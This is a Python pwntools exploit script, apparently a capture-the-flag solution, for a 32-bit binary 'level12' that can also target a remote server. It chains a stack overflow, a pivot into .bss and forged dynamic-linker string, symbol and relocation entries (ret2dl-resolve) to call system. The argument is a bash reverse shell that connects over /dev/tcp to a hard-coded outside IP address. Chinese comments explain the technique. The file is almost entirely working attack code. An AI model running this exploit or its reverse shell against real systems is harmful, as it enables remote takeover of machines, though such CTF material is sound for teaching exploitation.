#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level12"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22012)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

rebound_shell = 'bash -c \"/bin/bash -i > /dev/tcp/118.89.101.128/1234 0<&1 2<&1\"'

'''
the basic nums
'''
read_plt = 0x8048300
jump_alarm_plt = 0x804831b #use to jump 
plt_jump=0x80482F0
dlresolve_pos = 0x804A008
fd = 0
nbytes = 0x40
next_pos = 0x80484E9
leave_ret_pos = 0x8048455
pop_ebp_ret = 0x080484EB

bug_function_addr = 0x804843B

bss_start =0x804a000
bss_use = bss_start + 0x500
bss_stack = bss_use-0x14 # new_stack

link_map_addr =  0x8049F14
str_table_addr = 0x804822C
sym_table_addr = 0x80481CC
rel_table_addr = 0x80482B0
got_table_addr = 0x804A000

'''
what you want to fake
'''
fake_str_pos = bss_use 
fake_str = "system\x00" + rebound_shell + "\x00"
rebound_shell_addr = fake_str_pos + 7
str_off = fake_str_pos - str_table_addr

# pudding to 0x10
fake_sym_addr = bss_use + 0x4c
fake_sym = p32(str_off) + chr(0)*0x8 +chr(0x12) + chr(0)*3

fake_rel_addr =  bss_use + 0x5c
fake_rel_index = fake_rel_addr - rel_table_addr # yes it is the relative position
fake_rel = p32(0x804A010) + p32( (fake_sym_addr-sym_table_addr)*0x10 +7)

'''
payload on stack
'''
payload = 'a'*0x28 + p32(bss_stack)
payload += p32(read_plt)+p32(leave_ret_pos)+p32(fd)+p32(bss_stack)+p32(0xb0)

'''
payload on bss_stack
'''
payload += p32(0)  
payload += p32(jump_alarm_plt) +  p32(fake_rel_index)+p32(0) + p32(rebound_shell_addr) 
'''
payloa on .bss to fake
'''
payload += fake_str + 'a'*(0x4c-len(fake_str))
payload += fake_sym + fake_rel

debug()
r.sendline(payload)
r.interactive()

'''
1. find rop *
2. fake_str "system"
3. fake_sym
4. fake_rel
5. push fake__rel - rel_tab

##hint:输入只能有一次, 一次把所有的payload发完，但read要调用很多次
从alarm下手，最终一次调用的应该是alarm的.plt表, 会执行各种操作后执行system函数;
system的参数要提前压好；

'''
